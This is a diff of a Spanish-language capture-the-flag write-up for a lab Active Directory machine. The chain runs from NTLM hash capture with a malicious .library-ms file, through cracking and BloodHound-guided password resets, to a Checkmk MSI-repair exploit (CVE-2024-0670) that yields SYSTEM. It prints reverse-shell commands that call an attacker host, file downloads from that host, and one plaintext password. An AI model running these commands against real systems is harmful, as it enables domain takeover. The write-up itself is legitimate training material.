@@ -8,7 +8,8 @@ service_hint: Active Directory + NTLM Relay + Checkmk + MSI Repair
 tags:
   - Active Directory
   - NTLM Relay
-  - CVE
+  - CVE-2025-24054
+  - CVE-2024-0670
   - BloodHound
   - Privilege Escalation
   - Checkmk
@@ -26,15 +27,13 @@ summary: "Cadena de explotación: NTLM relay vía CVE-2025-24054 para compromete
 
 ## Reconocimiento
 
-El objetivo inicial fue mapear la superficie expuesta del controlador de dominio y confirmar que se trataba de un entorno Active Directory completo. La presencia de múltiples puertos típicos de Windows Server (Kerberos, LDAP, SMB, RDP, WinRM) ya indicaba que la máquina giraba en torno a enumeración y abuso de AD.
-
-Este primer escaneo sirve para detectar rápidamente los puertos abiertos y priorizar servicios.
+Empezamos con un escaneo completo de puertos para identificar la superficie expuesta del controlador de dominio. Queríamos saber cuántos servicios estaban abiertos y confirmar que nos enfrentábamos a un entorno Active Directory.
 
 ```bash
 nmap -p- --open -sS --min-rate 5000 -Pn 10.129.56.49
 ```
 
-Con los puertos localizados, este segundo escaneo profundiza en versiones, banners y fingerprints de servicio.
+Con los puertos identificados en el escaneo anterior, hicimos un escaneo más detallado con scripts de enumeración para obtener versiones, banners y confirmar los fingerprints de cada servicio detectado.
 
 ```bash
 nmap -p53,80,88,139,389,445,3268,3389,5986,6556,9389 -sCV 10.129.56.49
@@ -54,9 +53,7 @@ La captura original muestra la redirección inicial de la web hacia el virtual h
 
 ## Enumeración web y de dominio
 
-Una vez configurado el dominio en `/etc/hosts`, el siguiente paso fue expandir la superficie web mediante fuzzing de subdominios y directorios.
-
-Este comando fuzzea virtual hosts para descubrir posibles subdominios adicionales.
+Una vez configurado el dominio en `/etc/hosts`, nos enfocamos en expandir la superficie web. Primero fuzzeamos subdominios con wfuzz, ya que los entornos empresariales suelen tener servicios ocultos detrás de virtual hosts alternativos.
 
 ```bash
 wfuzz -H "Host: FUZZ.nanocorp.htb" --hc 404,403 \
@@ -68,7 +65,7 @@ Subdominio relevante:
 
 - `hire.nanocorp.htb`
 
-Este comando enumera directorios en el sitio principal para localizar rutas de interés.
+Con el dominio principal explorado, fuzzeamos directorios con gobuster para encontrar rutas no visibles desde la navegación normal, como paneles de administración o directorios de subida de archivos.
 
 ```bash
 gobuster dir -u http://nanocorp.htb \
@@ -78,7 +75,7 @@ gobuster dir -u http://nanocorp.htb \
 
 Directorios relevantes: `images`, `assets`, y rutas restringidas como `uploads` y `phpmyadmin`.
 
-Para enumerar usuarios del dominio, se utilizó Kerbrute contra el controlador de dominio.
+Enumeramos usuarios del dominio con Kerbrute. Esta herramienta prueba nombres de usuario contra el controlador de dominio usando Kerberos, indicándonos cuáles existen sin necesidad de tener credenciales previas.
 
 ```bash
 kerbrute userenum -d nanocorp.htb \
@@ -95,7 +92,7 @@ El agente de Checkmk en `6556/tcp` resultó ser una fuente clave de información
 
 El vector de entrada aprovecha una vulnerabilidad de NTLM relay mediante archivos `.library-ms` maliciosos. Cuando un usuario de Windows explora una carpeta que contiene este archivo, el sistema intenta conectarse a un recurso compartido SMB remoto, entregando un desafío NTLMv2 que puede ser capturado y crackeado.
 
-Primero se prepara un listener con Responder para capturar los hashes NTLMv2.
+Iniciamos Responder en nuestra interfaz tun0 para hacernos pasar por un servidor SMB malicioso. Cuando la víctima explore el recurso compartido, su sistema intentará autenticarse contra nosotros y capturaremos el hash NTLMv2.
 
 ```bash
 responder -I tun0
@@ -105,7 +102,7 @@ La captura muestra el momento en que se obtiene el hash del usuario `web_svc`.
 
 ![Captura de hash con Responder](/images/writeups/nanocorp/Pasted image 20260504112918.png)
 
-Para desencadenar la autenticación, se crea un archivo `.library-ms` malicioso que apunta al servidor SMB del atacante, se comprime en un ZIP y se entrega al objetivo (por ejemplo, subiéndolo a través de la web o mediante ingeniería social).
+Creamos el archivo `.library-ms` malicioso que apunta a nuestro servidor SMB. Cuando la víctima explore la carpeta que contiene este archivo, Windows intentará conectarse a nuestro recurso compartido y enviará su hash NTLMv2 para autenticarse. El archivo se comprime en un ZIP y se entrega al objetivo.
 
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
@@ -127,7 +124,7 @@ Para desencadenar la autenticación, se crea un archivo `.library-ms` malicioso 
 </libraryDescription>
 ```
 
-Una vez capturado el hash NTLMv2, se procede a crackearlo con Hashcat.
+Con el hash NTLMv2 de web_svc capturado, lo crackeamos con Hashcat usando el diccionario rockyou. Si la contraseña está en el diccionario, la recuperaremos en texto claro para acceder al dominio.
 
 ```bash
 hashcat -m 5600 web_svc.hash /usr/share/wordlists/rockyou.txt
@@ -138,7 +135,7 @@ Credencial obtenida:
 - Usuario: `web_svc`
 - Contraseña: `[REDACTED]`
 
-Se valida el acceso mediante NetExec para confirmar que las credenciales son válidas en el dominio.
+Verificamos que las credenciales funcionan contra el controlador de dominio usando NetExec contra SMB. Si recibimos un signo `[+]`, confirmamos que tenemos acceso autenticado al dominio con web_svc.
 
 ```bash
 netexec smb 10.129.56.49 -u web_svc -p '[REDACTED]'
@@ -146,9 +143,9 @@ netexec smb 10.129.56.49 -u web_svc -p '[REDACTED]'
 
 ## Enumeración de Active Directory con BloodHound
 
-Con credenciales válidas de `web_svc`, el siguiente paso fue mapear las relaciones de privilegio dentro del dominio usando BloodHound. Esto permite identificar caminos de escalada y movimiento lateral que no son evidentes con enumeración manual.
+Con las credenciales de web_svc en nuestro poder, mapeamos las relaciones de privilegio del dominio con BloodHound. Esto nos permite visualizar caminos de escalada que no son evidentes con enumeración manual.
 
-Este comando recolecta todos los datos del dominio usando las credenciales comprometidas.
+Ejecutamos bloodhound-python con las credenciales comprometidas para recolectar toda la información del dominio: usuarios, grupos, permisos y relaciones entre objetos.
 
 ```bash
 bloodhound-python -d nanocorp.htb -u web_svc -p '[REDACTED]' -ns 10.129.56.49 -c all
@@ -160,7 +157,7 @@ La visualización en BloodHound reveló un hallazgo crítico: `web_svc` tenía p
 
 ## Compromiso de monitoring_svc
 
-El primer paso para aprovechar la relación descubierta fue agregar a `web_svc` al grupo `IT_SUPPORT` usando `bloodyAD`.
+BloodHound reveló que web_svc puede agregarse al grupo IT_SUPPORT, y que IT_SUPPORT tiene permisos para cambiar la contraseña de monitoring_svc. Ejecutamos bloodyAD para agregar a web_svc a IT_SUPPORT y activar esa ruta de escalada.
 
 ```bash
 bloodyAD -d nanocorp.htb -u web_svc -p '[REDACTED]' --host 10.129.56.49 add groupMember IT_SUPPORT web_svc
@@ -168,13 +165,13 @@ bloodyAD -d nanocorp.htb -u web_svc -p '[REDACTED]' --host 10.129.56.49 add grou
 
 ![Escalada a SYSTEM mediante MSI repair](/images/writeups/nanocorp/Pasted image 20260504122100.png)
 
-Una vez como miembro de `IT_SUPPORT`, se procede a resetear la contraseña de `monitoring_svc`.
+Ahora que web_svc es miembro de IT_SUPPORT, aprovechamos el permiso heredado para resetear la contraseña de monitoring_svc. Con esto ganamos control total sobre esa cuenta de servicio.
 
 ```bash
 bloodyAD -d nanocorp.htb -u web_svc -p '[REDACTED]' --host 10.129.56.49 set password monitoring_svc '[REDACTED]'
 ```
 
-Con la nueva contraseña, se genera un TGT de Kerberos y se utiliza Impacket para obtener una shell WinRM como `monitoring_svc` en el puerto 5986.
+Generamos un ticket TGT de Kerberos para monitoring_svc usando su nueva contraseña, y luego usamos Impacket para conectarnos por WinRM al controlador de dominio. Así obtenemos una shell interactiva como monitoring_svc en el puerto 5986.
 
 ```bash
 getTGT.py nanocorp.htb/monitoring_svc:'[REDACTED]' -dc-ip 10.129.56.49
@@ -192,7 +189,7 @@ El agente de Checkmk instala un servicio que puede ser forzado a reparar su inst
 
 ### Enumeración de Checkmk
 
-Primero se confirma la presencia del agente en `C:\Program Files (x86)`:
+Nos conectamos a la máquina víctima y verificamos que el agente de Checkmk está instalado en `C:\Program Files (x86)`.
 
 ```powershell
 PS C:\Users\monitoring_svc\Documents> gci C:\progra~2
@@ -216,7 +213,7 @@ d-----         11/3/2025   4:13 PM                Windows Photo Viewer
 d-----          5/8/2021   1:34 AM                WindowsPowerShell
 ```
 
-Se consulta el registro para obtener la versión exacta y la ruta del instalador MSI:
+Consultamos el registro de Windows para obtener la versión exacta del agente y la ruta del instalador MSI. Estos datos son necesarios para confirmar la vulnerabilidad y localizar el instalador que vamos a manipular.
 
 ```
 reg query "HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall" /s
@@ -251,7 +248,7 @@ La versión **2.1.0p10** es vulnerable a `CVE-2024-0670`.
 
 ### Compilación y uso de RunasCs
 
-Para ejecutar comandos como `web_svc` desde la sesión actual de `monitoring_svc`, se clona y compila `RunasCs`:
+Necesitamos ejecutar comandos como web_svc desde la sesión actual de monitoring_svc para preparar la escalada. Usamos RunasCs, que permite ejecutar procesos como otro usuario si tenemos sus credenciales. Primero clonamos el repositorio y lo compilamos.
 
 ```bash
 git clone https://github.com/antonioCoco/RunasCs.git
@@ -264,7 +261,7 @@ Receiving objects: 100% (371/371), 371.79 KiB | 3.23 MiB/s, done.
 Resolving deltas: 100% (228/228), done.
 ```
 
-Se copian `nc.exe` y el código fuente al directorio de trabajo:
+Copiamos netcat para Windows (nc.exe) y el código fuente de RunasCs al directorio actual para tenerlos listos antes de transferirlos a la víctima.
 
 ```bash
 cp /usr/share/windows-resources/binaries/nc.exe .
@@ -272,13 +269,13 @@ ls
 base64_conversion_commands.ps1  compile_commands.txt  Invoke-RunasCs.ps1  LICENSE  nc.exe  README.md  RunasCs.cs
 ```
 
-Se sirve el contenido con Python para transferirlo a la víctima:
+Montamos un servidor HTTP con Python desde nuestra máquina atacante para transferir los archivos a la máquina Windows víctima.
 
 ```bash
 python3 -m http.server 8080
 ```
 
-En la máquina víctima, se descargan los archivos necesarios:
+Desde la shell de monitoring_svc descargamos el código fuente de RunasCs y nc.exe apuntando a nuestro servidor HTTP atacante.
 
 ```powershell
 C:\Users\monitoring_svc\Documents> wget "http://10.10.15.7:8080/RunasCs.cs" -UseBasicParsing -OutFile "RunasCs.cs"
@@ -288,7 +285,7 @@ C:\Users\monitoring_svc\Documents> wget "http://10.10.15.7:8080/RunasCs.cs" -Use
 C:\windows\temp> wget http://10.10.15.7:8080/nc.exe -UseBasicParsing -OutFile "nc.exe"
 ```
 
-Se compila `RunasCs.exe` usando el compilador de C# nativo de Windows:
+Compilamos RunasCs.exe con csc.exe, el compilador de C# que viene incluido en el .NET Framework de Windows. El compilador advierte que está limitado a C# 5, pero RunasCs compila sin problemas.
 
 ```powershell
 C:\Users\monitoring_svc\Documents> C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe -target:exe -optimize -out:RunasCs.exe RunasCs.cs
@@ -304,19 +301,19 @@ This compiler is provided as part of the Microsoft (R) .NET Framework, but only 
 
 ### Ejecución como web_svc
 
-Se inicia un listener para recibir la reverse shell:
+Antes de ejecutar RunasCs, abrimos un listener en nuestra máquina atacante para recibir la shell reversa que lanzará web_svc.
 
 ```bash
 nc -nlvp 5555
 ```
 
-Y se ejecuta `RunasCs` para lanzar `nc.exe` como `web_svc`:
+Ejecutamos RunasCs pasándole las credenciales de web_svc para que nc.exe nos envíe una shell reversa. Si todo funciona, recibiremos la conexión como el usuario web_svc.
 
 ```powershell
 PS C:\Users\monitoring_svc\Documents> .\RunasCs.exe web_svc "dksehdgh712!@#" "C:\Windows\Temp\nc.exe 10.10.15.7 5555 -e powershell.exe"
 ```
 
-Se confirma la identidad del nuevo contexto:
+Verificamos la identidad con whoami para confirmar que ahora estamos ejecutándonos en el contexto de web_svc, listos para el siguiente paso de la escalada.
 
 ```powershell
 PS C:\Windows\system32> whoami
@@ -325,7 +322,7 @@ web_svc
 
 ### Escalada a SYSTEM con privesc.ps1
 
-Una vez en el contexto de `web_svc`, se prepara el script `privesc.ps1` que automatiza la escalada mediante el abuso del proceso de reparación de MSI de Checkmk:
+Ahora que estamos en el contexto de web_svc, preparamos un script que automatiza la escalada a SYSTEM. El script explota CVE-2024-0670: genera cientos de archivos .cmd maliciosos con un payload de nc.exe, y dispara la reparación del MSI de Checkmk. Cuando el instalador se ejecute como SYSTEM y procese esos scripts .cmd, recibiremos nuestra shell como máximo usuario.
 
 ```powershell
 param(
@@ -373,25 +370,25 @@ Start-Process "msiexec.exe" -ArgumentList "/fa `"$msi`" /qn /l*vx C:\Windows\Tem
 Write-Host "[*] Trigger sent. Check listener."
 ```
 
-Se sirve el script con Python:
+Servimos el script privesc.ps1 desde nuestra máquina atacante con Python.
 
 ```bash
 python3 -m http.server 8080
 ```
 
-Y se descarga en la máquina víctima:
+Descargamos privesc.ps1 desde la shell de web_svc apuntando a nuestro servidor HTTP, y lo guardamos en C:\Windows\Temp.
 
 ```powershell
 PS C:\Windows\system32> wget "http://10.10.15.7:8080/privesc.ps1" -OutFile "C:\Windows\Temp\privesc.ps1"
 ```
 
-Se inicia el listener final para recibir la shell como SYSTEM:
+Abrimos el listener en el puerto 4444 para recibir la shell reversa como SYSTEM cuando se dispare la reparación del MSI de Checkmk.
 
 ```bash
 nc -nlvp 4444
 ```
 
-Y se ejecuta el script:
+Ejecutamos el script con la política de ejecución bypasseada. El script va a generar los .cmd maliciosos, disparar la reparación del MSI de Checkmk, y cuando el instalador ejecute esos scripts como SYSTEM, recibiremos la conexión en nuestro listener.
 
 ```powershell
 PS C:\Windows\system32> powershell -ExecutionPolicy Bypass -File C:\Windows\Temp\privesc.ps1
@@ -399,14 +396,14 @@ PS C:\Windows\system32> powershell -ExecutionPolicy Bypass -File C:\Windows\Temp
 
 ### Confirmación de acceso
 
-Una vez obtenida la shell como SYSTEM:
+La shell se conecta y verificamos nuestra identidad con whoami. La respuesta "nt authority\system" confirma que la escalada fue exitosa y tenemos control total del sistema.
 
 ```powershell
 C:\Windows\system32>whoami
 nt authority\system
 ```
 
-Con acceso a `nt authority\system`, ya solo quedaba leer la flag final. Su valor se omite deliberadamente.
+Con control total del sistema, leemos la flag final desde el escritorio del Administrador. Su valor se omite deliberadamente, pero la cadena de explotación está completa.
 
 ```bash
 C:\Users\Administrator\Desktop>type root.txt
